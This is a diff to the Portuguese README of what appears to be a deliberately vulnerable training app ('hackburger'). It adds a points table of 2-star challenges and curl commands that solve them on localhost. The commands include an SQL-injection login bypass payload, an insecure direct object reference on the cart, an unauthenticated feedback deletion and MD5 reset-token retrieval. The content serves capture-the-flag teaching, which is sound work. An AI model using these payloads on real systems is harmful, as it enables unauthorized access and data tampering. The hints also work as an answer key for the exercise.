@@ -61,6 +61,43 @@ curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/ftp/encode%20me.md
 
 > **Nota**: para pontuar, você precisa enviar um JWT válido no header `Authorization`. Se a rota é pública (ex: `/metrics`), o detector ainda tenta decodificar o token soft — faça login primeiro, copie o token do `localStorage` e use nos exemplos acima.
 
+## Catálogo (2-star)
+
+| Chave | Pts | Pista |
+|---|---|---|
+| `adminSectionChallenge` | 20 | Existe uma rota escondida `/api/misc/administration` (nome típico de painel antigo). |
+| `loginAdminChallenge` | 20 | `POST /api/legacy/login` concatena SQL. Payload clássico `admin@hackburger.com'--`. |
+| `emptyUserRegistrationChallenge` | 20 | `POST /api/legacy/register` não valida campos; envie `name:""`, `email:""`. |
+| `fiveStarFeedbackChallenge` | 20 | `DELETE /api/feedback/:id` não requer autenticação — delete o único feedback de 5 estrelas. |
+| `viewBasketChallenge` | 20 | `GET /api/cart?userId=X` confia cegamente no `userId` da query. |
+| `weirdCryptoChallenge` | 20 | `GET /api/misc/crypto/token/:userId` usa MD5 para tokens de reset. |
+| `whiteHatChallenge` | 20 | Descubra o `security.txt` em `/security.txt` ou `/.well-known/security.txt`. |
+
+### Exemplos (2-star)
+
+```bash
+# login_admin
+curl -X POST http://localhost:3000/api/legacy/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@hackburger.com'\''--","password":"x"}'
+
+# empty_user_registration
+curl -X POST http://localhost:3000/api/legacy/register \
+  -H "Content-Type: application/json" -d '{"name":"","email":"","password":""}'
+
+# view_basket (autenticado)
+curl -H "Authorization: Bearer $TOKEN" "http://localhost:3000/api/cart?userId=1"
+
+# five_star_feedback
+curl -X DELETE http://localhost:3000/api/feedback/1
+
+# weird_crypto
+curl -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/misc/crypto/token/1
+
+# white_hat
+curl http://localhost:3000/.well-known/security.txt
+```
+
 ## Como jogar
 
 1. Faça login (é necessário usuário autenticado para acumular pontos).
